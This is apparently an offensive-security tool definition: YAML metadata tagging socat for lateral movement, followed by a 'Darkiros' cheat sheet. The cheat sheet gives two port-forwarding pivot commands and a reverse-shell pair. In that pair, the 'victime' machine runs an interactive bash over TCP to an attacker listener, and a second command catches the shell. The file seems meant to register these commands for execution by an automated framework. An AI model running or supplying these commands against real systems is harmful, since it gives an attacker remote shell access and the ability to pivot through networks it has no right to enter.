---
trust_level: community
id: darkiros-socat
namespace: darkiros:tool:socat
name: socat
description: socat port forwarding listener (on local machine)
version: 1.0.0
capabilities:
- network.pivot.generic
platforms:
- cross-platform
techniques:
- lateral-movement
execution:
  template: socat
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: socat port forwarding listener (on local machine)
  command: ./socat TCP-LISTEN:[port_listener],fork,reuseaddr TCP-LISTEN:[port_to_forward]
- description: socat port forwarding connect (on remote machine)
  command: socat TCP:[connect_ip]:[connect_port] TCP:127.0.0.1:[port_to_forward]
- description: socat reverse shell (remote victime)
  command: ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[listner_ip]:[listner_port]
- description: socat reverse shell (local listener)
  command: socat file:`tty`,raw,echo=0 tcp-listen:[port|4444]
references:
- label: Source
  url: http://www.dest-unreach.org/socat/
- label: Darkiros
  url: https://darkiros.github.io/commands.html
items:
- NoCreds
services:
- HTTP
- SMB
features:
- local
- network-intensive
- pipes-stdout
---

# socat

Darkiros cheat sheet commands:

**socat port forwarding listener (on local machine)**
```
./socat TCP-LISTEN:[port_listener],fork,reuseaddr TCP-LISTEN:[port_to_forward]
```

**socat port forwarding connect (on remote machine)**
```
socat TCP:[connect_ip]:[connect_port] TCP:127.0.0.1:[port_to_forward]
```

**socat reverse shell (remote victime)**
```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[listner_ip]:[listner_port]
```

**socat reverse shell (local listener)**
```
socat file:`tty`,raw,echo=0 tcp-listen:[port|4444]
```
